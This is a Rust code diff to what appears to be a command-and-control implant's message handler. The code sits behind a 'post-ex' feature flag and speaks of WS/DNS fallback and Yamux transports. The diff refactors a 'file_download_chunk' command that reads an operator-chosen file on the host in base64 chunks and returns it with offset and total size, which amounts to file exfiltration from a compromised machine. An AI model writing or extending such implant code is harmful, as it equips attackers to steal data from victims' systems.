@@ -583,6 +583,8 @@ impl MessageHandler {
                     }
                 }
             }
+            // Control-plane chunk transfer: WS/DNS fallback only (no Yamux session).
+            // TCP/Yamux agents use the FILE (0x0E) binary stream (`file_stream`).
             #[cfg(feature = "post-ex")]
             "file_upload_chunk" => {
                 if let (Some(path), Some(data)) = (command_payload.path.as_deref(), command_payload.data.as_deref()) {
@@ -636,26 +638,27 @@ impl MessageHandler {
             }
             #[cfg(feature = "post-ex")]
             "file_download_chunk" => {
-                let target_path = command_payload.path.as_deref()
-                    .unwrap_or_else(|| {
-                        let parts: Vec<&str> = command_payload.command_content.split('|').collect();
-                        if parts.len() > 2 { parts[2] } else { command_payload.command_content.as_str() }
-                    });
-                
+                let target_path = command_payload.path.as_deref().unwrap_or("").to_string();
                 let mut offset = 0u64;
                 let mut size = 2 * 1024 * 1024;
-                
-                if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&command_payload.command_content) {
+
+                if let Ok(parsed) =
+                    serde_json::from_str::<serde_json::Value>(&command_payload.command_content)
+                {
                     offset = parsed.get("offset").and_then(|v| v.as_u64()).unwrap_or(0);
-                    size = parsed.get("size").and_then(|v| v.as_u64()).unwrap_or(2 * 1024 * 1024) as usize;
+                    size = parsed
+                        .get("size")
+                        .and_then(|v| v.as_u64())
+                        .unwrap_or(2 * 1024 * 1024) as usize;
                 }
-                
-                match crate::fs::download_chunk(target_path, offset, size) {
-                    Ok((base64_data, is_eof)) => {
+
+                match crate::fs::download_chunk(&target_path, offset, size) {
+                    Ok((base64_data, is_eof, total)) => {
                         let result_json = serde_json::json!({
                             "data": base64_data,
                             "is_eof": is_eof,
-                            "offset": offset
+                            "offset": offset,
+                            "total": total
                         });
                         CommandResult {
                             stdout: result_json.to_string(),
@@ -669,7 +672,7 @@ impl MessageHandler {
                         stderr: format!("Failed to download chunk: {}", e),
                         path: None,
                         req_id: None,
-                    }
+                    },
                 }
             }
             #[cfg(feature = "post-ex")]
